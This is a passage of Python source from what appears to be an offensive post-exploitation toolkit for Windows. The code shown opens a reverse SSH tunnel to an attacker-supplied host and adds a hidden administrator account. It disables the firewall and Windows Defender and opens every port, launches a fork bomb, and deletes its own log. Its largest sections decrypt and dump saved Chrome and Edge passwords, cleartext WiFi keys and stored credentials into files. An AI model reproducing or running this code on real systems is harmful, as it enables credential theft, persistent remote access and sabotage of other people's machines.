					logging.info("Allowed SSH Tunnel port 9000 in firewall")
					sleep(2)

					#stating the PS comand to persistent SSH tunnel
					attackeruser=input("Enter attacker SSH username: ")
					sleep(0.1)
					attackerip=input("Enter attacker IP (without port): ")
					sleep(0.1)
					correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
					sleep(0.1)
				else:
					logging.warning(f"Skipping openSSH installation and configuration")        
					#stating the PS comand to persistent SSH tunnel
					attackeruser=input("Enter attacker SSH username: ")
					sleep(0.1)
					attackerip=input("Enter attacker IP (without port): ")
					sleep(0.1)
					correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
					sleep(0.1)
				
				if correctsshinput == "y":
					logging.info(f"User confirmed SSH input details")
					print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
					sleep(1)
					print(Fore.YELLOW + "In the meanwhile run listener_attacker.sh on your attacker machine!")
					sleep(2)
					ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
					run_ps(ssh_tunnel)
					sleep(10)
					cls()
					break
				else:
					logging.error(f"User did not confirm SSH input details, action aborted")
					print(" ")
					sleep(0.1)
			else:
				print(" ")
				sleep(0.1)
				break
			
#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action ftp = FTP connection
	elif action == "ftp":
		logging.info(f"Chosen action ftp to attempt FTP connection")
		fwr21 = 'New-NetFirewallRule -DisplayName "Allow FTP 21" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow'
		run_ps(fwr21)
		ftpuser=input("Enter attacker user: ")
		ftpIP=input("Enter attacker IP: ")
		ftpconnect=r".\ftp "+ftpuser+"@"+ftpIP
		run_ps(ftpconnect)

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action ping = pinging target IP
	elif action == "ping":
		logging.info(f"Chosen action ping to check IP connectivity and response")
		targetip=input("Enter target IP to ping: ")
		subprocess.run(["ping", targetip])
		logging.info(f"Pinging the target machine")
		
#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action DiskFiller = filling up disk space
	elif action == "DiskFill" or action == "diskfill":
		logging.info(f"Chose action DiskFill to fill a target computer disk")
		usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
		if usermovefile == "y":
			pathtodiskfiller=input("Enter path to diskfiller.bat (example d:\\filler\\diskfiller.bat), will be in the same folder as this program: ")
			subprocess.run(pathtodiskfiller, shell=True)
		else:
			subprocess.run("diskfiller.bat", shell=True)

		logging.info(f"Started the diskfiller.bat")
	
#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action DiskHoster = hosting target disk on local network
	elif action == "DiskHost" or action == "diskhost":
		logging.info(f"Chosen action DiskHost to host target disk onto a local network")
		hostdisk="python -m http.server 8100 --bind 0.0.0.0"
		run_ps(hostdisk)

		sleep(1)
		print("Started a local folder share on port 8100")
		logging.info("Started a local folder share on port 8100")
		sleep(0.5)
		print("Go to http//:<targetip>:8100   to browse the files")

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action AddAdmin = creating new admin account on target machine
	elif action =="AddAdmin" or action == "addadmin":
		logging.info(f"Chosen action AddAdmin to generate a new admin account on target machine")
		newadminuser=input("Enter new admin username: ")
		sleep(0.1)
		newadminpass=input("Enter new admin password: ")
		sleep(0.1)
		createuser="net user " + newadminuser + " " + newadminpass + " /add"
		run_ps(createuser)
		sleep(1)
		addtoadmin="net localgroup Administrators " + newadminuser + " /add"
		run_ps(addtoadmin)
		print(Fore.GREEN + "New admin user created: " + newadminuser)
		logging.info(f"New admin user created: {newadminuser}")

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action PassExport = retrieving Chrome saved passwords
	elif action == "PassExport" or action == "passexport":
		logging.info(f"Chosen action PassExport to retrieve Chrome browsing history")
		
		# Check if we're on Windows
		if platform.system() != "Windows":
			print(Fore.RED + "[!] This feature requires Windows!")
			input("Press Enter to continue...")
			cls()
			continue
		
		try:
			import win32crypt  # type: ignore
			from Crypto.Cipher import AES #type:ignore
		except ImportError:
			print(Fore.RED + "[!] Install packages:")
			print(Fore.YELLOW + "pip install pywin32 pycryptodome")
			input("Press Enter to continue...")
			cls()
			continue
		
		def get_master_key():
			"""Get Chrome's master encryption key using DPAPI"""
			local_state_path = os.path.join(
				os.environ["USERPROFILE"], 
				"AppData", "Local", "Google", "Chrome", 
				"User Data", "Local State"
			)
			
			try:
				with open(local_state_path, "r", encoding="utf-8") as f:
					local_state = json.load(f)
				
				encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
				encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
				
				master_key = win32crypt.CryptUnprotectData(
					encrypted_key, None, None, None, 0
				)[1]
				
				return master_key
				
			except Exception as e:
				print(Fore.RED + f"[!] Failed to get master key: {e}")
				return None
		
		def try_decrypt_password(encrypted_password, master_key):
			"""Try to decrypt, return both encrypted and decrypted data"""
			if not encrypted_password:
				return {
					"decrypted": "",
					"encrypted_hex": "",
					"encrypted_b64": "",
					"status": "empty",
					"length": 0
				}
			
			# Store encrypted data in multiple formats
			encrypted_hex = encrypted_password.hex()
			encrypted_b64 = base64.b64encode(encrypted_password).decode('utf-8')
			
			# Try decryption methods
			decrypted_text = ""
			status = "encrypted_only"
			format_info = "unknown"
			
			try:
				# Method 1: Chrome v80+ AES-GCM
				if encrypted_password[:3] in [b'v10', b'v11']:
					format_info = encrypted_password[:3].decode('ascii', errors='ignore')
					nonce = encrypted_password[3:15]
					ciphertext_with_tag = encrypted_password[15:]
					
					if len(ciphertext_with_tag) >= 16:
						tag = ciphertext_with_tag[-16:]
						ciphertext = ciphertext_with_tag[:-16]
						
						cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
						decrypted = cipher.decrypt_and_verify(ciphertext, tag)
						decrypted_text = decrypted.decode('utf-8')
						status = "decrypted_aes_gcm"
					else:
						status = "aes_gcm_incomplete"
						
				# Method 2: DPAPI encrypted
				elif encrypted_password[:4] == b'\x01\x00\x00\x00':
					format_info = "dpapi"
					decrypted = win32crypt.CryptUnprotectData(
						encrypted_password, None, None, None, 0
					)[1]
					if decrypted:
						decrypted_text = decrypted.decode('utf-8')
						status = "decrypted_dpapi"
					else:
						status = "dpapi_failed"
				
				# Method 3: Unknown format but try DPAPI anyway
				else:
					format_info = f"unknown_{encrypted_password[:4].hex()}"
					try:
						decrypted = win32crypt.CryptUnprotectData(
							encrypted_password, None, None, None, 0
						)[1]
						if decrypted:
							decrypted_text = decrypted.decode('utf-8')
							status = "decrypted_unknown"
						else:
							status = "unknown_format"
					except:
						status = "unknown_format"
						
			except Exception as e:
				status = f"error_{str(e)[:30]}"
			
			return {
				"decrypted": decrypted_text,
				"encrypted_hex": encrypted_hex[:100] + "..." if len(encrypted_hex) > 100 else encrypted_hex,
				"encrypted_b64": encrypted_b64[:80] + "..." if len(encrypted_b64) > 80 else encrypted_b64,
				"status": status,
				"format": format_info,
				"length": len(encrypted_password)
			}
		
		try:
			print(Fore.YELLOW + "[*] Getting Chrome master encryption key...")
			master_key = get_master_key()
			
			if not master_key:
				print(Fore.RED + "[!] Could not get master key. Try:")
				print(Fore.YELLOW + "    1. Run as Administrator")
				print(Fore.YELLOW + "    2. Make sure Chrome is closed")
				input("Press Enter to continue...")
				cls()
				continue
			
			print(Fore.GREEN + f"[+] Got master key: {master_key[:16].hex()}...")
			
			# Path to Chrome passwords
			chrome_db_path = os.path.join(
				os.environ["USERPROFILE"], 
				"AppData", "Local", "Google", "Chrome", 
				"User Data", "Default", "Login Data"
			)
			
			if not os.path.exists(chrome_db_path):
				print(Fore.RED + "[!] Chrome password database not found")
				input("Press Enter to continue...")
				cls()
				continue
			
			# Copy database
			temp_db = "temp_chrome_passwords.db"
			shutil.copy2(chrome_db_path, temp_db)
			
			# Query database
			conn = sqlite3.connect(temp_db)
			cursor = conn.cursor()
			cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
			passwords = cursor.fetchall()
			
			if not passwords:
				print(Fore.YELLOW + "[!] No saved passwords found")
				conn.close()
				os.remove(temp_db)
				input("Press Enter to continue...")
				cls()
				continue
			
			print(Fore.GREEN + f"[+] Found {len(passwords)} saved passwords")
			
			# Process passwords
			all_results = []
			decrypted_count = 0
			
			for i, (url, username, encrypted_password) in enumerate(passwords[:25], 1):  # First 25
				result = try_decrypt_password(encrypted_password, master_key)
				
				entry = {
					"url": url,
					"username": username,
					**result  # Unpack all the decrypt result fields
				}
				all_results.append(entry)
				
				if result["decrypted"]:
					decrypted_count += 1
				
				# Show first 10 entries
				if i <= 10:
					print(Fore.CYAN + f"\n[{i}] {url[:40]}...")
					print(Fore.WHITE + f"    User: {username}")
					
					if result["decrypted"]:
						print(Fore.GREEN + f"    Pass: {result['decrypted'][:30]}...")
						print(Fore.YELLOW + f"    Status: {result['status']}")
					else:
						print(Fore.RED + f"    [ENCRYPTED]")
						print(Fore.YELLOW + f"    Format: {result['format']}")
						print(Fore.YELLOW + f"    Hex: {result['encrypted_hex'][:30]}...")
						print(Fore.YELLOW + f"    B64: {result['encrypted_b64'][:30]}...")
			
			# Save to JSON
			if all_results:
				filename = f"chrome_passwords.json"
				
				output_data = {
					"metadata": {
						"extraction_date": datetime.now().isoformat(),
						"machine": platform.node(),
						"os": platform.platform(),
						"total_passwords": len(passwords),
						"decrypted_success": decrypted_count,
						"master_key_preview": master_key[:16].hex(),
						"master_key_length": len(master_key)
					},
					"passwords": all_results
				}
				
				with open(filename, 'w', encoding='utf-8') as f:
					json.dump(output_data, f, indent=4, ensure_ascii=False)
				
				print(Fore.GREEN + f"\n[+] Saved ALL data to {filename}")
				print(Fore.YELLOW + f"[+] Successfully decrypted: {decrypted_count}/{len(passwords)}")
				print(Fore.CYAN + f"[+] JSON contains BOTH encrypted and decrypted data")
			
			conn.close()
			os.remove(temp_db)
			
		except Exception as e:
			print(Fore.RED + f"[!] Error: {e}")
			import traceback
			traceback.print_exc()
		
		input(Fore.YELLOW + "\nPress Enter to continue...")
		cls()


#
#
#
#
#
#
#
#
#
#Action ForkBomb = attempting a forkbomb

	elif action == "ForkBomb" or action == "forkbomb":
		logging.info(f"Chosen to attempt a forkbomb")
		# Create the fork bomb batch file
		run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
		run_ps('Set-Content -Path "Friend.bat" -Value "@echo off"')
		run_ps('Add-Content -Path "Friend.bat" -Value ":A"')
		run_ps('Add-Content -Path "Friend.bat" -Value "start %0"')
		run_ps('Add-Content -Path "Friend.bat" -Value "goto A"')
		
		# Execute it
		run_ps('Start-Process -FilePath "Friend.bat" -WindowStyle Hidden')
		
	#
	#
	#
	#
	#
	#
	#
	#
	#
	# 

#action PortOpener = opening ports in firewall
	elif action == "PortOpener" or action == "portopener":
		logging.info(f"Chosen action PortOpener to open ports in firewall")
		PortOpenerContinue=input("This action will take down the entire firewall and windows defender protection, are you sure you want to continue?")
		if PortOpenerContinue == "y":
			disablefirewall="Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
			run_ps(disablefirewall)
			logging.warning(f"Firewall disabled by user")
			sleep(1)
			disabledefender="Set-MpPreference -DisableRealtimeMonitoring $true"
			run_ps(disabledefender)
			logging.warning(f"Windows Defender real-time monitoring disabled by user")
			MpsSvcStop="sc config MpsSvc start= disabled"
			run_ps(MpsSvcStop)
			logging.warning(f"Windows Defender service disabled by user")
			stopMpsSvc="net stop MpsSvc"
			run_ps(stopMpsSvc)
			logging.warning(f"Windows Defender service stopped by user")
			ruledelete="netsh advfirewall firewall delete rule name=all"
			run_ps(ruledelete)
			logging.warning(f"All firewall rules deleted by user")
			print("Firewall and Windows Defender protection disabled")
			sleep(2)
			inboundtcp='netsh advfirewall firewall add rule name="OPEN_ALL_TCP_IN" dir=in action=allow protocol=TCP localport=1-65535'
			run_ps(inboundtcp)
			logging.info(f"All inbound TCP ports opened by user")
			inboundudp='netsh advfirewall firewall add rule name="OPEN_ALL_UDP_IN" dir=in action=allow protocol=UDP localport=1-65535'
			run_ps(inboundudp)
			logging.info(f"All inbound UDP ports opened by user")
			inboundall='netsh advfirewall firewall add rule name="OPEN_ALL_PROTOCOLS_IN" dir=in action=allow protocol=any'
			run_ps(inboundall)
			logging.info(f"All inbound protocols opened by user")
			outboundall='netsh advfirewall firewall add rule name="OPEN_ALL_OUT" dir=out action=allow protocol=any'
			run_ps(outboundall)
			logging.info(f"All outbound protocols opened by user")
			print("All ports opened in firewall")
			input("Press Enter to continue...")
		else:
			logging.info(f"User chose not to disable firewall and defender")
			print("Will not continue...")
			sleep(2)
			input("Press Enter to continue...")


#
#
#
#
#
#
#
#
#
#
  
#action PacketCapture = capturing packets on target machine
	elif action == "PacketCapture" or action == "packetcapture":
		logging.info(f"Chosen action PacketCapture to capture packets")
		run_ps('& "C:\\Program Files\\Wireshark\\dumpcap.exe" -D')

		interface_select = input("Enter network interface to capture packets on (Choose from the list): ")

		tcp_capture = f'& "C:\\Program Files\\Wireshark\\dumpcap.exe" -i {interface_select} -w test.pcapng'
		run_ps(tcp_capture)

		logging.info(f"Started packet capture on interface: {interface_select}")
		print("Packet capture started, to stop it press CTRL+C in this window")
		input("Press Enter to continue...")

#
#
#
#
#
#
#
#
#
#

#Action Venom = running a Venom payload
	elif action == "Venom" or action == "venom":
		logging.info(f"Chosen action Venom to run a Venom payload")
		venom=input("Enter full path to the payload (example D:\\USB\\Attack\\Venom\\payload.exe): ")
		run_ps(venom)


#
#
#
#
#
#
#
#
#
#

#Action LogDelete = deleting the program log file
	elif action =="DeleteLog" or action == "deletelog":
		logging.shutdown()
		os.remove("logger.log")


#
#
#
#
#
#
#
#
#
#



	elif action == "WifiCrack" or action == "wificrack":
		logging.info(f"Chosen action WifiPass to extract WiFi passwords")
		print(Fore.YELLOW + "[*] Extracting WiFi passwords...")
		
		try:
			# Export ALL WiFi profiles with CLEAR TEXT passwords
			print(Fore.CYAN + "[*] Exporting WiFi profiles...")
			netsh_path = r"C:\Windows\System32\netsh.exe"
			
			# Create temp folder
			temp_dir = "wifi_passwords_temp"
			os.makedirs(temp_dir, exist_ok=True)
			
			# Export all profiles to XML with passwords
			result = subprocess.run(
				[netsh_path, "wlan", "export", "profile", "key=clear", f"folder={temp_dir}"],
				capture_output=True,
				text=True
			)
			
			if "successfully" in result.stdout.lower():
				print(Fore.GREEN + "[+] WiFi profiles exported with passwords!")
				
				# Parse all XML files
				import glob
				wifi_passwords = []
				
				for xml_file in glob.glob(os.path.join(temp_dir, "*.xml")):
					try:
						with open(xml_file, 'r', encoding='utf-8') as f:
							content = f.read()
							
							# Extract SSID
							import re
							ssid_match = re.search(r'<name>([^<]+)</name>', content)
							key_match = re.search(r'<keyMaterial>([^<]+)</keyMaterial>', content)
							
							if ssid_match and key_match:
								ssid = ssid_match.group(1)
								password = key_match.group(1)
								
								wifi_passwords.append({
									"SSID": ssid,
									"Password": password,
									"File": os.path.basename(xml_file)
								})
								
								print(Fore.CYAN + f"\n  SSID: {ssid}")
								print(Fore.GREEN + f"  Password: {password}")
					except Exception as e:
						continue
				
				if wifi_passwords:
					# Save to JSON
					output_file = f"wifi_passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
					with open(output_file, 'w') as f:
						json.dump(wifi_passwords, f, indent=4)
					
					print(Fore.GREEN + f"\n[+] Saved {len(wifi_passwords)} WiFi passwords to {output_file}")
				else:
					print(Fore.YELLOW + "[!] Could not extract passwords from XML files")
				
				# Cleanup
				import shutil
				shutil.rmtree(temp_dir, ignore_errors=True)
			else:
				print(Fore.RED + "[!] Failed to export WiFi profiles")
				print(Fore.RED + f"Error: {result.stderr}")
		
		except Exception as e:
			print(Fore.RED + f"[!] Error: {e}")
		
		input("\nPress Enter to continue...")
		cls()



	elif action == "NetScan" or action == "netscan":
		logging.info(f"Chosen action NetworkPass to extract network passwords")
		print(Fore.YELLOW + "[*] Extracting network information (passwords are encrypted)...")
		
		output_lines = []
		
		# 1. Use CMDKEY with full path
		print(Fore.CYAN + "\n[1] Windows Credential Manager:")
		cmdkey_path = r"C:\Windows\System32\cmdkey.exe"
		result = subprocess.run([cmdkey_path, "/list"], capture_output=True, text=True)
		
		if result.stdout:
			print(Fore.GREEN + "[+] Stored credentials found:")
			print(result.stdout)
			output_lines.append("=== CREDENTIAL MANAGER ===\n" + result.stdout)
		else:
			print(Fore.YELLOW + "[!] No stored credentials")
			output_lines.append("=== CREDENTIAL MANAGER ===\nNone found")
		
		# 2. Use NET USE with full path
		print(Fore.CYAN + "\n[2] Mapped Network Drives:")
		net_path = r"C:\Windows\System32\net.exe"
		result = subprocess.run([net_path, "use"], capture_output=True, text=True)
		
		if result.stdout and "New connections" in result.stdout:
			print(Fore.GREEN + "[+] Mapped drives found:")
			print(result.stdout)
			output_lines.append("\n=== MAPPED DRIVES ===\n" + result.stdout)
		else:
			print(Fore.YELLOW + "[!] No mapped drives")
			output_lines.append("\n=== MAPPED DRIVES ===\nNone found")
		
		# 3. Get WiFi profiles (if any)
		print(Fore.CYAN + "\n[3] WiFi Profiles:")
		try:
			netsh_path = r"C:\Windows\System32\netsh.exe"
			result = subprocess.run([netsh_path, "wlan", "show", "profiles"], capture_output=True, text=True)
			
			if result.stdout and "All User Profile" in result.stdout:
				profiles = []
				for line in result.stdout.split('\n'):
					if "All User Profile" in line:
						profile = line.split(":")[1].strip()
						profiles.append(profile)
				
				print(Fore.GREEN + f"[+] Found {len(profiles)} WiFi profiles")
				print(", ".join(profiles[:10]))
				output_lines.append(f"\n=== WIFI PROFILES ===\nFound {len(profiles)} profiles")
			else:
				print(Fore.YELLOW + "[!] No WiFi profiles")
				output_lines.append("\n=== WIFI PROFILES ===\nNone found")
		except:
			print(Fore.YELLOW + "[!] Could not check WiFi")
		
		# 4. Save results
		output_file = f"network_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
		with open(output_file, 'w') as f:
			f.write("="*60 + "\n")
			f.write("NETWORK INFORMATION DUMP\n")
			f.write("="*60 + "\n\n")
			f.write(f"Time: {datetime.now()}\n")
			f.write(f"Machine: {platform.node()}\n")
			f.write(f"User: {os.environ.get('USERNAME', 'Unknown')}\n\n")
			
			for line in output_lines:
				f.write(line + "\n")
		
		print(Fore.GREEN + f"\n[+] Results saved to {output_file}")
		print(Fore.YELLOW + "\n[*] Note: Windows encrypts passwords with DPAPI")
		print(Fore.YELLOW + "[*] For actual password extraction, use tools like:")
		print(Fore.CYAN + "    • Mimikatz (requires admin)")
		print(Fore.CYAN + "    • Lazagne")
		print(Fore.CYAN + "    • Windows Credential Manager UI")
		
		input("\nPress Enter to continue...")
		cls()


	elif action == "AllPass" or action == "allpass":
		logging.info(f"Chosen action AllPass to extract ALL passwords")
		print(Fore.YELLOW + "[*] Starting COMPLETE password extraction...")
		print(Fore.CYAN + "[*] This may take a minute...")
		
		all_results = {
			"timestamp": datetime.now().isoformat(),
			"machine": platform.node(),
			"user": os.environ.get('USERNAME', 'Unknown'),
			"extractions": {}
		}
		
		# 1. CHROME PASSWORDS
		print(Fore.CYAN + "\n[1] Extracting Chrome passwords...")
		chrome_passwords = []
		try:
			from Crypto.Cipher import AES # type:ignore
			import win32crypt # type:ignore
			
			# Get Chrome master key
			local_state_path = os.path.join(
				os.environ['USERPROFILE'],
				'AppData', 'Local', 'Google', 'Chrome',
				'User Data', 'Local State'
			)
			
			if os.path.exists(local_state_path):
				with open(local_state_path, 'r', encoding='utf-8') as f:
					local_state = json.loads(f.read())
				
				encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
				encrypted_key = encrypted_key[5:]
				master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
				
				# Chrome databases
				chrome_paths = [
					os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
					os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 1', 'Login Data'),
					os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 2', 'Login Data'),
				]
				
				for chrome_db in chrome_paths:
					if os.path.exists(chrome_db):
						temp_db = "temp_chrome.db"
						try:
							shutil.copy2(chrome_db, temp_db)
							
							conn = sqlite3.connect(temp_db)
							cursor = conn.cursor()
							cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
							
							for url, username, encrypted_password in cursor.fetchall():
								if not encrypted_password:
									continue
								
								try:
									if encrypted_password[:3] == b'v10':
										nonce = encrypted_password[3:15]
										ciphertext = encrypted_password[15:-16]
										tag = encrypted_password[-16:]
										
										cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
										decrypted = cipher.decrypt_and_verify(ciphertext, tag)
										password = decrypted.decode('utf-8')
										
										chrome_passwords.append({
											"url": url,
											"username": username,
											"password": password
										})
								except:
									continue
							
							conn.close()
							os.remove(temp_db)
						except:
							pass
				
				print(Fore.GREEN + f"[+] Found {len(chrome_passwords)} Chrome passwords")
				all_results["extractions"]["chrome"] = {
					"count": len(chrome_passwords),
					"passwords": chrome_passwords[:50]  # First 50
				}
				
				# Show sample
				if chrome_passwords:
					print(Fore.WHITE + "  Sample:")
					for i, pwd in enumerate(chrome_passwords[:3]):
						print(Fore.CYAN + f"    {i+1}. {pwd['url'][:40]}...")
						print(Fore.WHITE + f"       User: {pwd['username'][:20]}")
						print(Fore.GREEN + f"       Pass: {pwd['password'][:20]}")
			else:
				print(Fore.YELLOW + "[!] Chrome not found")
		except Exception as e:
			print(Fore.RED + f"[!] Chrome error: {e}")
		
		# 2. MICROSOFT EDGE PASSWORDS
		print(Fore.CYAN + "\n[2] Extracting Microsoft Edge passwords...")
		edge_passwords = []
		try:
			edge_db_path = os.path.join(
				os.environ['USERPROFILE'],
				'AppData', 'Local', 'Microsoft', 'Edge',
				'User Data', 'Default', 'Login Data'
			)
			
			if os.path.exists(edge_db_path) and 'master_key' in locals():
				temp_db = "temp_edge.db"
				try:
					shutil.copy2(edge_db_path, temp_db)
					
					conn = sqlite3.connect(temp_db)
					cursor = conn.cursor()
					cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
					
					for url, username, encrypted_password in cursor.fetchall():
						if not encrypted_password:
							continue
						
						try:
							if encrypted_password[:3] == b'v10':
								nonce = encrypted_password[3:15]
								ciphertext = encrypted_password[15:-16]
								tag = encrypted_password[-16:]
								
								cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
								decrypted = cipher.decrypt_and_verify(ciphertext, tag)
								password = decrypted.decode('utf-8')
								
								edge_passwords.append({
									"url": url,
									"username": username,
									"password": password
								})
						except:
							continue
					
					conn.close()
					os.remove(temp_db)
					
					print(Fore.GREEN + f"[+] Found {len(edge_passwords)} Edge passwords")
					all_results["extractions"]["edge"] = {
						"count": len(edge_passwords),
						"passwords": edge_passwords[:50]
					}
				except:
					print(Fore.YELLOW + "[!] Could not access Edge database")
			else:
				print(Fore.YELLOW + "[!] Edge not found")
		except Exception as e:
			print(Fore.RED + f"[!] Edge error: {e}")
		
		# 3. WIFI PASSWORDS
		print(Fore.CYAN + "\n[3] Extracting WiFi passwords...")
		wifi_passwords = []
		try:
			netsh_path = r"C:\Windows\System32\netsh.exe"
			temp_dir = "temp_wifi"
			os.makedirs(temp_dir, exist_ok=True)
			
			result = subprocess.run(
				[netsh_path, "wlan", "export", "profile", "key=clear", f"folder={temp_dir}"],
				capture_output=True,
				text=True
			)
			
			if "successfully" in result.stdout.lower():
				import glob
				for xml_file in glob.glob(os.path.join(temp_dir, "*.xml")):
					try:
						with open(xml_file, 'r', encoding='utf-8') as f:
							content = f.read()
							
							import re
							ssid_match = re.search(r'<name>([^<]+)</name>', content)
							key_match = re.search(r'<keyMaterial>([^<]+)</keyMaterial>', content)
							
							if ssid_match and key_match:
								wifi_passwords.append({
									"ssid": ssid_match.group(1),
									"password": key_match.group(1)
								})
					except:
						continue
				
				shutil.rmtree(temp_dir, ignore_errors=True)
				
				print(Fore.GREEN + f"[+] Found {len(wifi_passwords)} WiFi passwords")
				all_results["extractions"]["wifi"] = {
					"count": len(wifi_passwords),
					"passwords": wifi_passwords
				}
				
				# Show sample
				if wifi_passwords:
					print(Fore.WHITE + "  Sample:")
					for i, wifi in enumerate(wifi_passwords[:5]):
						print(Fore.CYAN + f"    {i+1}. {wifi['ssid']}")
						print(Fore.GREEN + f"       Pass: {wifi['password']}")
			else:
				print(Fore.YELLOW + "[!] Could not export WiFi profiles")
		except Exception as e:
			print(Fore.RED + f"[!] WiFi error: {e}")
		
		# 4. WINDOWS CREDENTIAL MANAGER (Metadata only)
		print(Fore.CYAN + "\n[4] Checking Windows Credential Manager...")
		try:
			cmdkey_path = r"C:\Windows\System32\cmdkey.exe"
			result = subprocess.run([cmdkey_path, "/list"], capture_output=True, text=True)
			
			if result.stdout:
				credentials = []
				lines = result.stdout.strip().split('\n')
				current_entry = {}
				
				for line in lines:
					line = line.strip()
					if line.startswith('Target:'):
						if current_entry:
							credentials.append(current_entry)
						current_entry = {'Target': line.replace('Target:', '').strip()}
					elif line.startswith('Type:'):
						current_entry['Type'] = line.replace('Type:', '').strip()
					elif line.startswith('User:'):
						current_entry['User'] = line.replace('User:', '').strip()
				
				if current_entry:
					credentials.append(current_entry)
				
				print(Fore.GREEN + f"[+] Found {len(credentials)} stored credentials")
				all_results["extractions"]["windows_credentials"] = {
					"count": len(credentials),
					"credentials": credentials
				}
				
				# Show sample
				if credentials:
					print(Fore.WHITE + "  Sample:")
					for i, cred in enumerate(credentials[:3]):
						print(Fore.CYAN + f"    {i+1}. {cred.get('Target', 'N/A')}")
						if 'User' in cred:
							print(Fore.WHITE + f"       User: {cred['User']}")
			else:
				print(Fore.YELLOW + "[!] No stored Windows credentials")
		except Exception as e:
			print(Fore.RED + f"[!] Credential error: {e}")
		
		# 5. FIREFOX (if exists - shows encrypted data)
		print(Fore.CYAN + "\n[5] Checking Firefox...")
		try:
			import glob
			firefox_path = os.path.join(
				os.environ['APPDATA'],
				'Mozilla', 'Firefox', 'Profiles'
			)
			
			if os.path.exists(firefox_path):
				profiles = glob.glob(os.path.join(firefox_path, '*.default*'))
				
				if profiles:
					profile = profiles[0]
					signons_path = os.path.join(profile, 'logins.json')
					
					if os.path.exists(signons_path):
						with open(signons_path, 'r', encoding='utf-8') as f:
							data = json.load(f)
						
						firefox_logins = data.get('logins', [])
						print(Fore.YELLOW + f"[*] Found {len(firefox_logins)} Firefox logins (encrypted)")
						print(Fore.YELLOW + "[*] Firefox requires master password for decryption")
						
						all_results["extractions"]["firefox"] = {
							"count": len(firefox_logins),
							"note": "Encrypted - requires master password",
							"logins": firefox_logins[:10]
						}
					else:
						print(Fore.YELLOW + "[!] Firefox logins.json not found")
				else:
					print(Fore.YELLOW + "[!] No Firefox profiles found")
			else:
				print(Fore.YELLOW + "[!] Firefox not installed")
		except Exception as e:
			print(Fore.RED + f"[!] Firefox error: {e}")
		
		# 6. OPERA/OTHER BROWSERS
		print(Fore.CYAN + "\n[6] Checking other browsers...")
		try:
			# Opera
			opera_paths = [
				os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data'),
				os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable', 'Login Data'),
			]
			
			opera_count = 0
			for opera_db in opera_paths:
				if os.path.exists(opera_db):
					opera_count += 1
			
			if opera_count > 0:
				print(Fore.YELLOW + f"[*] Found Opera database(s) - similar to Chrome")
				all_results["extractions"]["opera"] = {
					"found": True,
					"note": "Similar to Chrome encryption"
				}
			else:
				print(Fore.YELLOW + "[!] No other browsers detected")
		except Exception as e:
			print(Fore.RED + f"[!] Other browsers error: {e}")
		
		# SAVE EVERYTHING
		print(Fore.CYAN + "\n" + "="*60)
		print(Fore.YELLOW + "[*] SAVING ALL EXTRACTED DATA...")
		
		# Create summary
		total_passwords = 0
		for category, data in all_results["extractions"].items():
			if "count" in data:
				total_passwords += data["count"]
		
		all_results["summary"] = {
			"total_extracted_items": total_passwords,
			"categories_found": list(all_results["extractions"].keys()),
			"successful_decryption": len(chrome_passwords) + len(edge_passwords) + len(wifi_passwords)
		}
		
		# Save JSON
		json_file = f"ALL_PASSWORDS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
		with open(json_file, 'w', encoding='utf-8') as f:
			json.dump(all_results, f, indent=4, ensure_ascii=False)
		
		# Save readable summary
		summary_file = f"PASSWORD_SUMMARY_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
		with open(summary_file, 'w', encoding='utf-8') as f:
			f.write("="*70 + "\n")
			f.write("COMPLETE PASSWORD EXTRACTION REPORT\n")
			f.write("="*70 + "\n\n")
			f.write(f"Machine: {platform.node()}\n")
			f.write(f"User: {os.environ.get('USERNAME', 'Unknown')}\n")
			f.write(f"Date: {datetime.now()}\n")
			f.write(f"Total extracted items: {total_passwords}\n\n")
			
			f.write("EXTRACTION RESULTS:\n")
			f.write("-"*70 + "\n")
			
			for category, data in all_results["extractions"].items():
				f.write(f"\n{category.upper()}:\n")
				if "count" in data:
					f.write(f"  Found: {data['count']}\n")
				if "passwords" in data and data["passwords"]:
					f.write("  Sample passwords:\n")
					for i, pwd in enumerate(data["passwords"][:3]):
						if category == "wifi":
							f.write(f"    {i+1}. SSID: {pwd.get('ssid', 'N/A')}\n")
							f.write(f"       Password: {pwd.get('password', 'N/A')}\n")
						elif category in ["chrome", "edge"]:
							f.write(f"    {i+1}. URL: {pwd.get('url', 'N/A')[:50]}...\n")
							f.write(f"       User: {pwd.get('username', 'N/A')[:30]}...\n")
							f.write(f"       Password: {pwd.get('password', 'N/A')[:20]}...\n")
				f.write("\n")
			
